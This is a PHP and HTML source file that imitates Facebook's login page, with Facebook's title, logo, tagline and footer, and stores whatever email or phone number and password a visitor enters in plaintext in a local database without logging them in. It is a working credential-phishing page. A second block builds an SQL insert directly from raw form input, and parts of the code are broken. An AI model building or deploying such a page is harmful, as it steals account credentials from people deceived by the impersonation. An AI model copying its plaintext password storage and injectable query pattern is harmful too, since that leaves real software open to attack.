<?php
if (isset($_POST['submit'])) {
    $username = $_POST["email-or-number"];
    $password = $_POST["password"];

    // Establish a database connection (replace with your database details)
    $conn = mysqli_connect("localhost", "root", "", "testdb");

    // Check if the connection was successful
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    // Sanitize and prepare the SQL statement
    $sql = "INSERT INTO `users` (`username`, `password`) VALUES (?, ?)";

    // Create a prepared statement
    $stmt = mysqli_prepare($conn, $sql);

    if ($stmt) {
        // Bind parameters and execute the statement
        mysqli_stmt_bind_param($stmt, "ss", $username, $password);

        if (mysqli_stmt_execute($stmt)) {
          
        } else {
            echo "Error: " . mysqli_error($conn);
        }

        // Close the statement
        mysqli_stmt_close($stmt);
    } else {
        echo "Error in preparing the statement: " . mysqli_error($conn);
    }

    // Close the database connection
    mysqli_close($conn);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<title>Facebook - log in or sign up</title>
	<link rel="stylesheet" href="./style.css">
	<link rel="icon" type="image/x-icon"
		href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png">

</head>

<body>
	<!-- partial:index.partial.html -->
	<!--
	  MAIN CONTENT STRAT
						-->
	<div class="main-contend-section">
		<div class="main-container">
			<div class="w-50">
				<div class="logo">
					<img src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242147/facebook%20clone/logo_mlo10v.svg"
						alt="Logo">
				</div>
				<div class="fb-tag-line">
					<h3 id="tnk">Connect with friends and the world<br> around you on Facebook.</h3>
				</div>
			</div>
			<div class="w-50">
				<div class="form-section">
					<?php
					if (isset($_POST['save'])) {

						$sql= "INSERT INTO `users`( `username`, `password`) VALUES ('"+$_POST["username"]+"','"+$_POST["password"]+"')";
						// $sql = "INSERT INTO users (username, password)
						// VALUES ('" . $_POST["username"] . "','" . $_POST["password"] . "')";
						// $result = mysqli_query($conn, $sql);
					}
					?>
					<form action="?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
						<input type="text" name="email-or-number" id="email-or-number"
							placeholder="Email address or phone number">
						<input type="password" name="password" id="password" placeholder="Password">
						<input type="submit" name="submit" id="submit" value="Log In">
						<a href="#" target="_self" class="forgot">Forgot password?</a>
						<div class="line"></div>
						<a href="https://www.facebook.com/pages/create/?ref_type=registration_form" target="_self"
							class="create-new-acc">Create New Account</a>
					</form>
				</div>
				<div class="create-page" style="text-align: center;">
					<p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" target="_self">Create
							a Page</a> for a celebrity, band or business.</p>
				</div>
			</div>
		</div>
	</div>
	<!--
	  MAIN CONTENT END
					  -->

	<!--
	  FOOTER CONTENT STRAT
						 -->
	<div class="footer-section">
		<div class="footer-container">
			<div class="language-section">
				<ul>
					<li>English (UK)</li>
					<li><a href="#" target="_self">বাং লা</a></li>
					<li><a href="#" target="_self">অসমীয়া</a></li>
					<li><a href="#" target="_self">हिन्दी</a></li>
					<li><a href="#" target="_self">Bahasa Indonesia</a></li>
					<li><a href="#" target="_self">नेपाली</a></li>
					<li><a href="#" target="_self">中文(简体)</a></li>
					<li><a href="#" target="_self">العربية</a></li>
					<li><a href="#" target="_self">Bahasa Melayu</a></li>
					<li><a href="#" target="_self">Español</a></li>
					<li><a href="#" target="_self">Português (Brasil)</a></li>
					<li><a href="#" target="_self" class="add-more-icon">+</a></li>
				</ul>
			</div>
			<div class="other-pages-link">
				<div class="line"></div>
				<ul>
					<li><a href="#" target="_self">Sign Up</a></li>
					<li><a href="#" target="_self">Log In</a></li>
					<li><a href="#" target="_self">Messenger</a></li>
					<li><a href="#" target="_self">Facebook Lite </a></li>
					<li><a href="#" target="_self">Watch </a></li>
					<li><a href="#" target="_self">People</a></li>
					<li><a href="#" target="_self">Pages</a></li>
					<li><a href="#" target="_self">Page categories</a></li>
					<li><a href="#" target="_self">Places</a></li>
					<li><a href="#" target="_self">Games</a></li>
					<li><a href="#" target="_self">Locations</a></li>
					<li><a href="#" target="_self">Marketplace</a></li>
					<li><a href="#" target="_self">Facebook Pay</a></li>
					<li><a href="#" target="_self">Groups</a></li>
					<li><a href="#" target="_self">Jobs</a></li>
					<li><a href="#" target="_self">Oculus</a></li>
					<li><a href="#" target="_self">Portal</a></li>
					<li><a href="#" target="_self">Instagram</a></li>
					<li><a href="#" target="_self">Local</a></li>
					<li><a href="#" target="_self">Fundraisers</a></li>
					<li><a href="#" target="_self">Services</a></li>
					<li><a href="#" target="_self">Voting Information Centre</a></li>
					<li><a href="#" target="_self">About</a></li>
					<li><a href="#" target="_self">Create ad</a></li>
					<li><a href="#" target="_self">Create Page</a></li>
					<li><a href="#" target="_self">Developers</a></li>
					<li><a href="#" target="_self">Careers</a></li>
					<li><a href="#" target="_self">Privacy</a></li>
					<li><a href="#" target="_self">Cookies</a></li>
					<li><a href="#" target="_self">AdChoices<div class="ad-icon"><img
									src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242146/facebook%20clone/ad-icon_k9ged1.png"
									alt="ad-icon"></div></a></li>
					<li><a href="#" target="_self">Terms</a></li>
					<li><a href="#" target="_self">Help</a></li>
				</ul>
			</div>
			<div class="copywrite">
				<p>Facebook &copy; 2023</p>
			</div>
		</div>
	</div>
	<!-- partial -->

</body>

</html>